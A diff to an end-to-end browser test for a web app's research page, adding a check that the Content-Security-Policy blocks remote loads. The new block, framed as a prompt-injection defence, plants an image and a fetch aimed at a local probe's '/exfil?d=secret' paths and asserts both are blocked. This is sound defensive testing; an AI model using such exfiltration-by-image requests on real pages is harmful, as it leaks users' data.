@@ -7,6 +7,7 @@
 //   node e2e/layout-check.mjs
 import { createRequire } from 'node:module'
 import path from 'node:path'
+import http from 'node:http'
 import { startStack, BRIDGE, WEB_PORT, ROOT } from './stack.mjs'
 
 const require = createRequire(path.join(ROOT, 'sidecar', 'package.json'))
@@ -25,6 +26,8 @@ try {
     const page = await ctx.newPage()
     const errors = []
     page.on('pageerror', (e) => errors.push(e.message))
+    // The Content-Security-Policy must not block anything the app itself needs.
+    page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) errors.push(`CSP: ${m.text()}`) })
     await page.goto(`http://127.0.0.1:${WEB_PORT}/research`)
     await page.waitForSelector('[data-testid=question]', { timeout: 30000 })
     await page.waitForTimeout(800)
@@ -66,6 +69,38 @@ try {
     }
     if (errors.length) fail(lang, `page errors: ${errors.join(' | ')}`)
     await ctx.close()
+  }
+  // Prompt injection: an answer must never make the page load a remote
+  // address. The policy blocks an <img> to another site even if one slipped
+  // into the page; the probe below must never reach the server.
+  {
+    let hits = 0
+    const probe = http.createServer((_req, res) => { hits++; res.writeHead(200, { 'Content-Type': 'image/gif' }); res.end() })
+    await new Promise((r) => probe.listen(0, '127.0.0.1', r))
+    const ctx = await browser.newContext()
+    await ctx.addInitScript(BRIDGE(st.ids.a))
+    const page = await ctx.newPage()
+    await page.goto(`http://127.0.0.1:${WEB_PORT}/research`)
+    await page.waitForSelector('[data-testid=question]', { timeout: 30000 })
+    const r = await page.evaluate(async (port) => {
+      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]')
+      let violated = false
+      document.addEventListener('securitypolicyviolation', () => { violated = true })
+      const img = document.createElement('img')
+      img.src = `http://localhost:${port}/exfil?d=secret`
+      document.body.appendChild(img)
+      let fetched = true
+      try { await fetch(`http://localhost:${port}/exfil2?d=secret`) } catch { fetched = false }
+      await new Promise((ok) => setTimeout(ok, 500))
+      return { meta: meta?.getAttribute('content') || '', violated, fetched }
+    }, probe.address().port)
+    if (!/img-src 'self'/.test(r.meta)) fail('csp', 'the built page has no Content-Security-Policy with img-src')
+    if (!r.violated) fail('csp', 'a remote image was not reported as blocked')
+    if (r.fetched) fail('csp', 'a request to another address was not blocked')
+    if (hits) fail('csp', `the remote probe was contacted ${hits} time(s)`)
+    if (!failures.some((f) => f.startsWith('csp'))) console.log('✓ Content-Security-Policy: remote image and request blocked')
+    await ctx.close()
+    probe.close()
   }
 } finally {
   await browser.close()
